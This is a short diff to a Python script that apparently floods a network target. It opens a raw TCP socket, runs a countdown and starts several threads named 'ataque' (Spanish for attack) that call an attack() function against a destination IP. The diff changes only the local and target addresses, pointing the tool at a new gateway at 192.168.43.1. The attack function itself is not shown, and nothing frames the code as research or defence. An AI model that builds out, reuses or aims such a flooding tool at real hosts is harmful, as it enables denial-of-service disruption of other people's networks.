@@ -121,7 +121,7 @@ def countdown(t):
 # create a raw socket and bind it to the public interface
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 
-HOST = '192.168.0.15'
+HOST = '192.168.43.12'
 s.bind(('', 0))
 
 
@@ -130,7 +130,7 @@ countdown(3)
 
 i = 0
 
-dest_ip = '192.168.0.1'
+dest_ip = '192.168.43.1'
 
 ataque2 = Thread(target=attack,args=[dest_ip])
 ataque3 = Thread(target=attack,args=[dest_ip])
